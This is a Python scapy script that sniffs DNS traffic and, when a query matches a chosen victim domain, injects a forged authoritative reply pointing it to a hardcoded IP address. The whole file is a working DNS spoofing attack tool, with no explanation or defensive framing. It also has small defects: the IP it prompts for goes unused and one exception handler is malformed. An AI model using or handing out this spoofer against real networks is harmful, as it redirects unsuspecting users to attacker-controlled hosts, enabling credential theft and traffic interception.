from scapy.all import *
from datetime import datetime
import time
import datetime
import sys

try :
    interface = input("[*] Enter Desired Interface: ")
    domain = input("[*] Enter Victim Domain: ")
    des_ip = input("[*] Enter Desired IP: ")
    filter_bpf = 'udp and port 53'
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)


def dns_reply(pkt):
    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
        DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
        an=DNSRR(ttl=100, rdata='140.82.121.3')) 
    send(spoofed_pkt)

def sniff_DNS(pkt):
    pkt_time = pkt.sprintf('%sent.time%')
    try:
        if DNSQR in pkt and pkt.dport == 53:
        # queries
           print('[**] Detected DNS QR Message at: ' + pkt_time)
           if pkt[DNS].qd.qname:
               print(str(pkt[DNS].qd.qname))
               if domain in str(pkt[DNS].qd.qname):
                print("success")
                dns_reply(pkt)
           
        elif DNSRR in pkt and pkt.sport == 53:
            print ('[**] Detected DNS RR Message at: ' + pkt_time)
            if pkt[DNS].qd.qname:
               print(str(pkt[DNS].qd.qname))
        # responses

 # 
    except KeyboardInterrupt():
        pass
# ------ START SNIFFER 

sniff(iface=interface, filter=filter_bpf, store=0,  prn=sniff_DNS)

